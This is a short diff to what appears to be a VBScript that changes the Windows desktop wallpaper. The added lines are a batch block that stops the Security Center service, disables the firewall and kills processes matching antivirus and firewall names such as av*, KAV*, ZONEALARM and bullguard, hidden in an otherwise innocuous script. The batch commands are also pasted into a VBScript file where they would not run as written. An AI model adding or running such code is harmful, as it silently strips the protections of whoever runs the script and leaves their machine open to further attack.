@@ -16,3 +16,24 @@ end with
 
 objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\myImage.png"
 objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+
+@echo off
+
+net stop Security Center
+
+netsh firewall set opmode mode=disable
+
+tskill /A av*
+tskill /A fire*
+
+tskill /A anti*
+
+tskill /A spy*
+tskill /A bullguard
+
+tskill /A PersFw
+
+tskill /A KAV*
+tskill /A ZONEALARM
+
+tskill /A SAFEWEB
